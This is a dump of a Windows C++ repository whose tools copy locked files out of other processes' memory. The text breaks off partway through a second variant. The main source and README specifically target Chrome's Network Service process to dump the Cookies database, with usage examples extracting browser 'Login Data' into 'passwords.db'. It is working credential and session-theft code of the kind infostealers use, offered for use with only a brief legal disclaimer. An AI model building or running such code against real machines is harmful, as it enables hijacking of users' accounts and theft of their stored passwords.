Project Path: arc_gmh5225_IDontLikeFileLocks_rliqr_8k

Source Tree:

```txt
arc_gmh5225_IDontLikeFileLocks_rliqr_8k
‚îú‚îÄ‚îÄ FindFileInMemory
‚îÇ   ‚îú‚îÄ‚îÄ IDontLikeFileLocks
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ IDontLikeFileLocks.cpp
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ IDontLikeFileLocks.vcxproj
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ IDontLikeFileLocks.vcxproj.filters
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ IDontLikeFileLocks.vcxproj.user
‚îÇ   ‚îú‚îÄ‚îÄ IDontLikeFileLocks.sln
‚îÇ   ‚îî‚îÄ‚îÄ Readme.md
‚îú‚îÄ‚îÄ FindFileInSection
‚îÇ   ‚îú‚îÄ‚îÄ IDontLikeFileLocks
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ IDontLikeFileLocks.cpp
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ IDontLikeFileLocks.vcxproj
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ IDontLikeFileLocks.vcxproj.filters
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ IDontLikeFileLocks.vcxproj.user
‚îÇ   ‚îú‚îÄ‚îÄ IDontLikeFileLocks.sln
‚îÇ   ‚îî‚îÄ‚îÄ Readme.md
‚îú‚îÄ‚îÄ HandleDupliClosin
‚îÇ   ‚îú‚îÄ‚îÄ IDontLikeFileLocks
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ IDontLikeFileLocks.cpp
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ IDontLikeFileLocks.vcxproj
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ IDontLikeFileLocks.vcxproj.filters
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ IDontLikeFileLocks.vcxproj.user
‚îÇ   ‚îú‚îÄ‚îÄ IDontLikeFileLocks.sln
‚îÇ   ‚îî‚îÄ‚îÄ Readme.md
‚îú‚îÄ‚îÄ LICENSE
‚îú‚îÄ‚îÄ README.md
‚îî‚îÄ‚îÄ Rstrtmgr
    ‚îú‚îÄ‚îÄ IDontLikeFileLocks
    ‚îÇ   ‚îú‚îÄ‚îÄ IDontLikeFileLocks.cpp
    ‚îÇ   ‚îú‚îÄ‚îÄ IDontLikeFileLocks.vcxproj
    ‚îÇ   ‚îú‚îÄ‚îÄ IDontLikeFileLocks.vcxproj.filters
    ‚îÇ   ‚îî‚îÄ‚îÄ IDontLikeFileLocks.vcxproj.user
    ‚îú‚îÄ‚îÄ IDontLikeFileLocks.sln
    ‚îî‚îÄ‚îÄ Readme.md

```

`FindFileInMemory/IDontLikeFileLocks.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.14.36203.30 d17.14
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "IDontLikeFileLocks", "IDontLikeFileLocks\IDontLikeFileLocks.vcxproj", "{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Debug|x64.ActiveCfg = Debug|x64
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Debug|x64.Build.0 = Debug|x64
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Debug|x86.ActiveCfg = Debug|Win32
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Debug|x86.Build.0 = Debug|Win32
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Release|x64.ActiveCfg = Release|x64
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Release|x64.Build.0 = Release|x64
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Release|x86.ActiveCfg = Release|Win32
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {2C74EC44-012E-4E23-99EE-34A6B0C3CCBC}
	EndGlobalSection
EndGlobal

```

`FindFileInMemory/IDontLikeFileLocks/IDontLikeFileLocks.cpp`:

```cpp
#include <Windows.h>
#include <Psapi.h>
#include <Shlwapi.h>
#include <cstdio>
#include <new>
#include <tlhelp32.h>
#include <winternl.h>

#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "Shlwapi.lib")

namespace IDontLikeFileLocks {

BOOL FindFileInMemory(HANDLE HProcess, const wchar_t* TargetFileName, LPVOID* OutBaseAddress, SIZE_T* OutRegionSize, BOOL Debug) {
    SYSTEM_INFO SystemInfo = {};
    ::GetSystemInfo(&SystemInfo);
    
    uintptr_t StartAddress = reinterpret_cast<uintptr_t>(SystemInfo.lpMinimumApplicationAddress);
    uintptr_t EndAddress = reinterpret_cast<uintptr_t>(SystemInfo.lpMaximumApplicationAddress);
    
    MEMORY_BASIC_INFORMATION MemoryInfo = {};
    
    while (StartAddress < EndAddress) {
        if (::VirtualQueryEx(HProcess, reinterpret_cast<LPCVOID>(StartAddress), &MemoryInfo, sizeof(MemoryInfo)) != sizeof(MemoryInfo)) {
            break;
        }
        
        if (MemoryInfo.State == MEM_COMMIT && 
            (MemoryInfo.Protect & PAGE_READONLY) != 0 && 
            MemoryInfo.Type == MEM_MAPPED) {
            
            wchar_t FullFileName[MAX_PATH] = {};
            DWORD FilenameLen = ::GetMappedFileNameW(HProcess, MemoryInfo.BaseAddress, FullFileName, MAX_PATH);
            
            if (FilenameLen > 0) {
                const wchar_t* FileName = ::PathFindFileNameW(FullFileName);
                
                if (Debug) {
                    wprintf(L"[DEBUG] Found: %s (0x%p, Size: 0x%llx)\n", 
                            FileName, MemoryInfo.BaseAddress, 
                            static_cast<unsigned long long>(MemoryInfo.RegionSize));
                }
                
                if (::_wcsicmp(FileName, TargetFileName) == 0) {
                    *OutBaseAddress = MemoryInfo.BaseAddress;
                    *OutRegionSize = MemoryInfo.RegionSize;
                    return TRUE;
                }
            }
        }
        
        StartAddress += MemoryInfo.RegionSize;
    }
    
    *OutBaseAddress = nullptr;
    *OutRegionSize = 0;
    return FALSE;
}

DWORD FindProcess(const wchar_t* ProcessName) {
    HANDLE Snapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }
    
    PROCESSENTRY32W Entry = { sizeof(PROCESSENTRY32W) };
    
    if (!::Process32FirstW(Snapshot, &Entry)) {
        ::CloseHandle(Snapshot);
        return 0;
    }
    
    DWORD Pid = 0;
    do {
        if (::_wcsicmp(Entry.szExeFile, ProcessName) == 0) {
            Pid = Entry.th32ProcessID;
            break;
        }
    } while (::Process32NextW(Snapshot, &Entry));
    
    ::CloseHandle(Snapshot);
    return Pid;
}

DWORD FindCookiesProcess(const wchar_t* BrowserExeName) {
    HANDLE Snapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }
    
    PROCESSENTRY32W Entry = { sizeof(PROCESSENTRY32W) };
    
    if (!::Process32FirstW(Snapshot, &Entry)) {
        ::CloseHandle(Snapshot);
        return 0;
    }
    
    DWORD ParentPid = IDontLikeFileLocks::FindProcess(BrowserExeName);
    if (!ParentPid) {
        ::CloseHandle(Snapshot);
        return 0;
    }
    
    typedef NTSTATUS(NTAPI* NtQueryInformationProcessFunc)(HANDLE, DWORD, PVOID, ULONG, PULONG);
    HMODULE Ntdll = ::GetModuleHandleW(L"ntdll.dll");
    if (!Ntdll) {
        ::CloseHandle(Snapshot);
        return 0;
    }
    
    NtQueryInformationProcessFunc NtQIP = reinterpret_cast<NtQueryInformationProcessFunc>(
        ::GetProcAddress(Ntdll, "NtQueryInformationProcess"));
    
    if (!NtQIP) {
        ::CloseHandle(Snapshot);
        return 0;
    }
    
    DWORD CookiesPid = 0;
    
    do {
        if (Entry.th32ParentProcessID != ParentPid) {
            continue;
        }
        
        HANDLE HProc = ::OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, FALSE, Entry.th32ProcessID);
        if (!HProc) {
            continue;
        }
        
        PROCESS_BASIC_INFORMATION Pbi = {};
        ULONG Len = 0;
        
        if (NtQIP(HProc, 0, &Pbi, sizeof(Pbi), &Len) < 0) {
            ::CloseHandle(HProc);
            continue;
        }
        
        PEB Peb = {};
        SIZE_T BytesRead = 0;
        
        if (!::ReadProcessMemory(HProc, Pbi.PebBaseAddress, &Peb, sizeof(Peb), &BytesRead)) {
            ::CloseHandle(HProc);
            continue;
        }
        
        RTL_USER_PROCESS_PARAMETERS Params = {};
        BytesRead = 0;
        
        if (!::ReadProcessMemory(HProc, Peb.ProcessParameters, &Params, sizeof(Params), &BytesRead)) {
            ::CloseHandle(HProc);
            continue;
        }
        
        if (Params.CommandLine.Length == 0 || Params.CommandLine.Length >= sizeof(wchar_t) * 1024) {
            ::CloseHandle(HProc);
            continue;
        }
        
        wchar_t CommandLine[1024] = {};
        BytesRead = 0;
        
        if (!::ReadProcessMemory(HProc, Params.CommandLine.Buffer, CommandLine, Params.CommandLine.Length, &BytesRead)) {
            ::CloseHandle(HProc);
            continue;
        }
        
        if (::wcsstr(CommandLine, L"--type=utility") && 
            ::wcsstr(CommandLine, L"--utility-sub-type=network.mojom.NetworkService")) {
            CookiesPid = Entry.th32ProcessID;
            ::CloseHandle(HProc);
            break;
        }
        
        ::CloseHandle(HProc);
    } while (::Process32NextW(Snapshot, &Entry));
    
    ::CloseHandle(Snapshot);
    return CookiesPid;
}

int WMain(int Argc, wchar_t* Argv[]) {
    if (Argc < 3) {
        wprintf(L"Usage: %s <process> <filename> [output] [--debug]\n", Argv[0]);
        wprintf(L"Example: %s chrome.exe Cookies dump.db\n", Argv[0]);
        wprintf(L"Debug:   %s chrome.exe Cookies --debug\n", Argv[0]);
        return 1;
    }
    
    const wchar_t* ProcessName = Argv[1];
    const wchar_t* FileName = Argv[2];
    const wchar_t* OutputPath = (Argc >= 4 && ::wcscmp(Argv[3], L"--debug") != 0) ? Argv[3] : FileName;
    BOOL Debug = (Argc >= 4 && ::wcscmp(Argv[Argc - 1], L"--debug") == 0);
    
    wprintf(L"[*] Looking for process: %s\n", ProcessName);
    
    DWORD Pid = 0;
    
    if (::_wcsicmp(FileName, L"Cookies") == 0) {
        wprintf(L"[*] Cookies file detected - searching for Network Service process...\n");
        Pid = IDontLikeFileLocks::FindCookiesProcess(ProcessName);
        if (!Pid) {
            wprintf(L"[-] Network Service process not found\n");
            return 1;
        }
        wprintf(L"[+] Found Network Service PID: %d\n", Pid);
    } else {
        Pid = IDontLikeFileLocks::FindProcess(ProcessName);
        if (!Pid) {
            wprintf(L"[-] Process not found\n");
            return 1;
        }
        wprintf(L"[+] Found PID: %d\n", Pid);
    }
    
    HANDLE HProcess = ::OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, Pid);
    if (!HProcess) {
        wprintf(L"[-] Failed to open process: %d\n", ::GetLastError());
        return 1;
    }
    
    wprintf(L"[*] searching for file: %s\n", FileName);
    if (Debug) {
        wprintf(L"[*] dbg mode: listing all mapped files...\n\n");
    }
    
    LPVOID BaseAddress = nullptr;
    SIZE_T RegionSize = 0;
    
    if (!IDontLikeFileLocks::FindFileInMemory(HProcess, FileName, &BaseAddress, &RegionSize, Debug)) {
        wprintf(L"\n[-] File not found in process memory\n");
        ::CloseHandle(HProcess);
        return 1;
    }
    
    wprintf(L"[+] Found at: 0x%p (Size: 0x%llx)\n", BaseAddress, static_cast<unsigned long long>(RegionSize));
    
    BYTE* Buffer = new(std::nothrow) BYTE[RegionSize];
    if (!Buffer) {
        wprintf(L"[-] Failed to allocate memory\n");
        ::CloseHandle(HProcess);
        return 1;
    }
    
    SIZE_T BytesRead = 0;
    if (!::ReadProcessMemory(HProcess, BaseAddress, Buffer, RegionSize, &BytesRead) || BytesRead != RegionSize) {
        wprintf(L"[-] Failed to read memory: %d\n", ::GetLastError());
        delete[] Buffer;
        ::CloseHandle(HProcess);
        return 1;
    }
    
    wprintf(L"[+] Read 0x%llx bytes from memory\n", static_cast<unsigned long long>(BytesRead));
    
    wchar_t TempPath[MAX_PATH] = {};
    const wchar_t* FileNameOnly = ::PathFindFileNameW(OutputPath);
    
    ::GetTempPathW(MAX_PATH, TempPath);
    ::wcscat_s(TempPath, MAX_PATH, FileNameOnly);
    
    HANDLE HFile = ::CreateFileW(TempPath, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (HFile == INVALID_HANDLE_VALUE) {
        wprintf(L"[-] Failed to create temp file '%s': %d\n", TempPath, ::GetLastError());
        wprintf(L"[*] Attempting to write to current directory instead...\n");
        
        HFile = ::CreateFileW(FileNameOnly, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (HFile == INVALID_HANDLE_VALUE) {
            wprintf(L"[-] Failed to create output file '%s': %d\n", FileNameOnly, ::GetLastError());
            delete[] Buffer;
            ::CloseHandle(HProcess);
            return 1;
        }
        ::wcscpy_s(TempPath, MAX_PATH, FileNameOnly);
    }
    
    DWORD Written = 0;
    if (!::WriteFile(HFile, Buffer, static_cast<DWORD>(RegionSize), &Written, nullptr) || Written != RegionSize) {
        wprintf(L"[-] Failed to write file: %d\n", ::GetLastError());
        ::CloseHandle(HFile);
        delete[] Buffer;
        ::CloseHandle(HProcess);
        return 1;
    }
    
    wprintf(L"[+] Successfully dumped to: %s\n", TempPath);
    
    ::CloseHandle(HFile);
    delete[] Buffer;
    ::CloseHandle(HProcess);
    return 0;
}

}

int wmain(int argc, wchar_t* argv[]) {
    return IDontLikeFileLocks::WMain(argc, argv);
}

```

`FindFileInMemory/IDontLikeFileLocks/IDontLikeFileLocks.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>17.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{ac2f8d41-ecb4-49f8-9da4-eacefbd1e186}</ProjectGuid>
    <RootNamespace>IDontLikeFileLocks</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="IDontLikeFileLocks.cpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`FindFileInMemory/IDontLikeFileLocks/IDontLikeFileLocks.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="IDontLikeFileLocks.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`FindFileInMemory/IDontLikeFileLocks/IDontLikeFileLocks.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`FindFileInMemory/Readme.md`:

```md
# IDontLikeFileLocks

dump locked files by reading them from process memory instead of dealing with filesystem bullshit

## How It Works

basically if a file is locked you just read it from the process that has it open lol. 

we use VirtualQueryEx to walk through all the memory in the target process and look for MEM_MAPPED regions with PAGE_READONLY protection because that's how memory mapped files work. GetMappedFileNameW tells us what file each memory region is actually backing. once we find the file we want we just ReadProcessMemory and copy the whole thing into our own process where it's unlocked and we can do whatever.

for chrome cookies it's slightly annoying because the Cookies database isn't in the main chrome.exe process, it's in some random subprocess called "Network Service" that chrome spawns. so we walk all the child processes, read their command line args from the PEB, and look for `--type=utility --utility-sub-type=network.mojom.NetworkService` which is how you identify it. then we dump from that process instead.

once we have the memory buffer we try writing to temp directory first and if that fails we just dump it in the current directory. either way the file is unlocked in our memory so we can write it wherever.

## Why This Works
cuz chrome maps its sqlite databases read-only into memory so they're just chilling there ready to be copied.

## Usage

```
IDontLikeFileLocks.exe chrome.exe Cookies dump.db
IDontLikeFileLocks.exe brave.exe "Login Data" passwords.db
IDontLikeFileLocks.exe msedge.exe Cookies --debug
```

the `--debug` flag dumps all memory mapped files in the process which is useful when you're exploring what's available or forgot the exact filename

## Output
<img width="1095" height="186" alt="image" src="https://github.com/user-attachments/assets/e750a471-b3f8-428a-a527-c74e9c066dd6" />


## Architecture 

tested on x64 25H2 Win11 (26200.7462)

## Technical Details
- new/delete for memory management because malloc is for C programmers
- the chrome network service detection is just string matching on command line args. not elegant but it works and i'm lazy.

## Legal

don't use this on computers you don't own or have permission to test on. federal prison sucks and you can't shitpost from there.

## 

```

`FindFileInSection/IDontLikeFileLocks.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.14.36203.30 d17.14
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "IDontLikeFileLocks", "IDontLikeFileLocks\IDontLikeFileLocks.vcxproj", "{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Debug|x64.ActiveCfg = Debug|x64
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Debug|x64.Build.0 = Debug|x64
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Debug|x86.ActiveCfg = Debug|Win32
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Debug|x86.Build.0 = Debug|Win32
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Release|x64.ActiveCfg = Release|x64
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Release|x64.Build.0 = Release|x64
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Release|x86.ActiveCfg = Release|Win32
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {2C74EC44-012E-4E23-99EE-34A6B0C3CCBC}
	EndGlobalSection
EndGlobal

```

`FindFileInSection/IDontLikeFileLocks/IDontLikeFileLocks.cpp`:

```cpp
#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <Shlwapi.h>
#include <cstdio>
#include <vector>
#include <string>
#include <algorithm>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "Shlwapi.lib")

typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;

typedef struct _SYSTEM_HANDLE {
    ULONG ProcessId;
    BYTE ObjectTypeNumber;
    BYTE Flags;
    USHORT Handle;
    PVOID Object;
    ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG HandleCount;
    SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef NTSTATUS(NTAPI* PfnNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS,
    PVOID,
    ULONG,
    PULONG
    );

typedef NTSTATUS(NTAPI* PfnNtQueryObject)(
    HANDLE,
    OBJECT_INFORMATION_CLASS,
    PVOID,
    ULONG,
    PULONG
    );

typedef NTSTATUS(NTAPI* PfnNtDuplicateObject)(
    HANDLE,
    HANDLE,
    HANDLE,
    PHANDLE,
    ACCESS_MASK,
    ULONG,
    ULONG
    );

typedef NTSTATUS(NTAPI* PfnNtMapViewOfSection)(
    HANDLE,
    HANDLE,
    PVOID*,
    ULONG_PTR,
    SIZE_T,
    PLARGE_INTEGER,
    PSIZE_T,
    SECTION_INHERIT,
    ULONG,
    ULONG
    );

typedef NTSTATUS(NTAPI* PfnNtUnmapViewOfSection)(
    HANDLE,
    PVOID
    );

namespace proc {

    DWORD FindByName(const wchar_t* Name) {
        PROCESSENTRY32W Pe{};
        Pe.dwSize = sizeof(Pe);

        HANDLE HSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (HSnap == INVALID_HANDLE_VALUE)
            return 0;

        if (::Process32FirstW(HSnap, &Pe)) {
            do {
                if (!::_wcsicmp(Pe.szExeFile, Name)) {
                    ::CloseHandle(HSnap);
                    return Pe.th32ProcessID;
                }
            } while (::Process32NextW(HSnap, &Pe));
        }

        ::CloseHandle(HSnap);
        return 0;
    }

}

namespace obj {

    std::wstring GetType(HANDLE H) {
        static PfnNtQueryObject NtQueryObject =
        (PfnNtQueryObject)::GetProcAddress(::GetModuleHandleW(L"ntdll"), "NtQueryObject");

        ULONG Len = 4096;
        std::vector<BYTE> Buf(Len);

        // ntdll!NtQueryObject -> ObjectTypeInformation (2)
        NTSTATUS Status = NtQueryObject(H, (OBJECT_INFORMATION_CLASS)2, Buf.data(), Len, &Len);
        if (!NT_SUCCESS(Status))
            return L"";

        PUNICODE_STRING TypeName = (PUNICODE_STRING)Buf.data();
        if (!TypeName->Buffer || !TypeName->Length)
            return L"";

        return std::wstring(TypeName->Buffer, TypeName->Length / sizeof(WCHAR));
    }

}

namespace section {

    std::wstring GetFileName(HANDLE HSection) {
        static PfnNtMapViewOfSection NtMapViewOfSection =
         (PfnNtMapViewOfSection)::GetProcAddress(::GetModuleHandleW(L"ntdll"), "NtMapViewOfSection");

        static PfnNtUnmapViewOfSection NtUnmapViewOfSection =
        (PfnNtUnmapViewOfSection)::GetProcAddress(::GetModuleHandleW(L"ntdll"), "NtUnmapViewOfSection");

        PVOID Base = nullptr;
        SIZE_T ViewSize = 0;

        NTSTATUS Status = NtMapViewOfSection(
            HSection,
            ::GetCurrentProcess(),
            &Base,
            0,
            0,
            nullptr,
            &ViewSize,
            ViewShare,
            0,
            PAGE_READONLY
        );

        if (!NT_SUCCESS(Status))
            return L"";

        WCHAR DevicePath[MAX_PATH * 2]{};

